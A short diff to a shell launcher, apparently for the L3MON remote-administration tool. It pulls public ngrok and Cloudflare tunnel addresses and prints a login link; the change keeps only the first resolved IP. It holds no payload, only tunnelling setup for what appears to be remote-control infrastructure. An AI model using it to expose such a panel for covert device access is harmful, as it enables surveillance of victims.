@@ -20,7 +20,7 @@ sleep 8
 cdf=$(cat /L3MON/ngrok/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
 #brows=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep https)
 #links=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0].public_url|grep tcp)
-ip=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|grep io|sed 's#^#host #g'|bash|awk '{print $NF}')
+ip=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|grep io|sed 's#^#host #g'|bash|awk '{print $NF}'|sed -n '1p')
 port=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|tail -1)
 
 echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $cdf"
